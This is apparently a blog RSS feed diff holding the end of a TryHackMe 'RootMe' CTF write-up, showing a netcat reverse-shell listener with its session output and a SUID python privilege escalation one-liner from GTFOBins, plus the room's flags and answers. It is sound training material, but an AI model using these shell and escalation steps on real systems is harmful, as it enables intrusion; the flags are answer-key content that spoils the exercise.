+&lt;img src=&#34;../panel2.png&#34;  alt=&#34;home page&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;Wooo file is successfully uploaded&amp;hellip;&lt;br&gt;
+Now go to &lt;code&gt;http://$IP/uploads/&lt;/code&gt;&lt;/p&gt;
+
+&lt;img src=&#34;../uploads.png&#34;  alt=&#34;home page&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;file is uploaded.&lt;br&gt;
+now we use netcat tool to gain the access of reverse shell.&lt;/p&gt;
+&lt;h1 id=&#34;netcat&#34;&gt;netcat&lt;/h1&gt;
+&lt;p&gt;Run the following command.&lt;br&gt;
+command:&lt;code&gt;nc -lvnp 4444&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;┌──&lt;/span&gt;(sumit&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;㉿&lt;/span&gt;mr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;nob0dy)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;~/&lt;/span&gt;ctf&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;tryhackme&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;rootme]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;└─$&lt;/span&gt; nc &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;               
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listening on [any] &lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt; ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;connect to [&lt;span style=&#34;color:#ae81ff&#34;&gt;10.8.161.225&lt;/span&gt;] &lt;span style=&#34;color:#a6e22e&#34;&gt;from&lt;/span&gt; (UNKNOWN) [&lt;span style=&#34;color:#ae81ff&#34;&gt;10.10.156.27&lt;/span&gt;] &lt;span style=&#34;color:#ae81ff&#34;&gt;38336&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Linux rootme &lt;span style=&#34;color:#ae81ff&#34;&gt;4.15.0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;generic &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;113&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Ubuntu SMP Thu Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; UTC &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; x86_64 x86_64 x86_64 GNU&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;Linux
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;09&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;08&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; up  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; users,  load average: &lt;span style=&#34;color:#ae81ff&#34;&gt;0.00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0.00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0.00&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;USER     TTY      FROM             LOGIN&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;   IDLE   JCPU   PCPU WHAT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;uid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;(www&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;data) gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;(www&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;data) groups&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;(www&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;data)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;sh: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; can&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;t access tty; job control turned off
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We get the shell access, now gothrough the all files and folders. try to find user.txt run the following command.&lt;br&gt;
+command:&lt;code&gt;find -type f -name user.txt&lt;/code&gt;\&lt;/p&gt;
+
+&lt;img src=&#34;../flag1.png&#34;  alt=&#34;home page&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;Run:&lt;br&gt;
+command:&lt;code&gt;cd var/www&lt;/code&gt;&lt;br&gt;
+command:&lt;code&gt;ls&lt;/code&gt;&lt;br&gt;
+command:&lt;code&gt;cat user.txt&lt;/code&gt;\&lt;/p&gt;
+&lt;p&gt;We got our first flag:
+&lt;code&gt;THM{y0u_g0t_a_sh3ll}&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;-task-4-privilege-escalation&#34;&gt;# Task 4 Privilege escalation&lt;/h1&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
+&lt;p&gt;Now that we have a shell, let&amp;rsquo;s escalate our privileges to root.&lt;br&gt;
+From hint run the following command to search a file with SUID permission and we got the file with the name python.&lt;br&gt;
+command:&lt;code&gt;find / -user root -perm /4000&lt;/code&gt;\&lt;/p&gt;
+&lt;p&gt;We have a shell but it is not stable. From hint do some research on GTFOBins, Google it. Search for python in gtfobins go the SUID section we got the command.&lt;/p&gt;
+
+&lt;img src=&#34;../gtfobin.png&#34;  alt=&#34;home page&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;command:&lt;code&gt;python -c &#39;import os; os.execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, &amp;quot;-p&amp;quot;)&#39;&lt;/code&gt;&lt;br&gt;
+command:&lt;code&gt;cd root&lt;/code&gt;&lt;br&gt;
+command:&lt;code&gt;ls&lt;/code&gt;&lt;br&gt;
+command:&lt;code&gt;cat root.txt&lt;/code&gt;\&lt;/p&gt;
+&lt;p&gt;By running the above command we get the root access or a stable shell now try to access &lt;code&gt;root.txt&lt;/code&gt; file.
+we got our 2nd flag&amp;hellip;.
+flag:&lt;code&gt;THM{pr1v1l3g3_3sc4l4t10n}&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;qna-2&#34;&gt;QnA:&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Search for files with SUID permission, which file is weird?&lt;br&gt;
+&lt;code&gt;ans: /usr/bin/python&lt;/code&gt;\&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Find a form to escalate your privileges.&lt;br&gt;
+&lt;code&gt;ans: no answer needed&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;root.txt
+&lt;code&gt;ans: THM{pr1v1l3g3_3sc4l4t10n}&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;congrats-we-have-successfully-completed-the-room-hope-you-learnt-something-new&#34;&gt;Congrats, we have successfully completed the room, hope you learnt something new&amp;hellip;&lt;/h1&gt;
+&lt;p&gt;Thanks for the reading&amp;hellip;&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>Pickle Rick</title>
       <link>https://secblogs.netlify.app/posts/pickle-rick/pickle-rick/</link>
